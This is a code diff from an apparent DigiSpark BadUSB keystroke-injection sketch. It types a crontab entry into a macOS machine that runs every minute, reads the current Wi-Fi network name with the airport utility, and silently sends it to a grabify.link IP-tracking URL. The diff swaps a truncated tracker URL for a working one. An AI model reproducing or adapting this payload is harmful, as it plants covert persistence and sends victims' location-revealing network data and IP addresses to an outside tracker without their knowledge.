@@ -21,7 +21,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}')\"  https://grabi/58T3HD/");
+  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}')\"  https://grabify.link/JE6TX7/");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
   DigiKeyboard.delay(500);
